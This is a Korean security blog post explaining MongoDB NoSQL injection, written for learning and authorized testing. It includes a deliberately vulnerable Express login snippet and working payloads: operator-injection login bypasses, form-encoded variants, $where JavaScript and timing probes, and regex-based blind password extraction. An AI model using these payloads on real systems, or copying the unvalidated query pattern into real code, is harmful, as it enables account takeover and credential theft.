---
title: "NoSQL 인젝션 (NoSQL Injection)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, NoSQL Injection]
tags: [nosql, mongodb, injection, web]
description: "문자열이어야 할 입력이 쿼리 연산자 객체로 들어와 조회 조건이 바뀌는 NoSQL 인젝션의 개념과, 연산자 주입·인증 우회·블라인드 추출 구문을 정리합니다."
mermaid: true
---

> NoSQL 인젝션은 SQL 문자열을 깨는 공격이 아니라, **문자열이어야 할 입력이 객체(쿼리 연산자)로 들어와** 조회 조건 자체가 바뀌는 문제다.

## 개념

MongoDB 같은 문서 DB의 조회 조건은 객체다. `{ user: "kim" }`은 "user가 kim"이고, `{ user: { $ne: null } }`은 "user가 null이 아님"이다. 요청 본문(JSON, 또는 파서가 객체로 만든 폼)을 **검증 없이 조건 객체에 넣으면** 값 대신 연산자 객체가 들어가 의미가 바뀐다.

```javascript
app.post("/login", async (req, res) => {
  const { username, password } = req.body;          // 타입 확인 없음
  const user = await db.collection("users")
    .findOne({ username, password });               // 입력이 조건 객체로 직행
});
```

`username`/`password`가 문자열이라는 보장이 없다. PHP·Express처럼 `a[b]=c` 표기를 중첩 객체로 풀어 주는 프레임워크에서는 JSON이 아닌 폼 요청도 같은 문제가 된다. 코드에서 `find(req.body)`처럼 요청을 통째로 조건에 넘기는 줄이 핵심 발생 지점이다.

## 공격·우회 구문

점검은 허가된 범위에서, 로그인·검색·필터처럼 조건을 받는 지점을 본다.

### 연산자 주입 — 인증 우회

값 자리에 비교 연산자 객체를 넣어 조건을 항상 참으로 만든다.

```json
{"username": "admin", "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": "^"}}
```

폼·쿼리스트링에서 객체로 풀리는 경우:

```
username=admin&password[$ne]=null
username[$ne]=&password[$ne]=
```

### 서버 측 JS 평가 ($where)

`$where`가 활성화돼 있고 입력이 닿으면 조건에 JS 식을 넣는다.

```json
{"$where": "this.username == 'admin'"}
{"$where": "sleep(5000)"}
```

### 블라인드 추출 (참/거짓·정규식)

응답 차이로 값을 한 글자씩 추정한다.

```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
```

### 확인 요령

```
문자열 필드에 객체·배열을 넣어 500 오류·응답 변화·틀린 값인데 성공을 관찰
정상/오류 응답(상태코드·길이)을 먼저 기준선으로 기록
```

## 참고 자료

- [OWASP WSTG: Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [CWE-943: Improper Neutralization of Special Elements in Data Query Logic](https://cwe.mitre.org/data/definitions/943.html)
- [MongoDB: Query and Projection Operators](https://www.mongodb.com/docs/manual/reference/operator/query/)
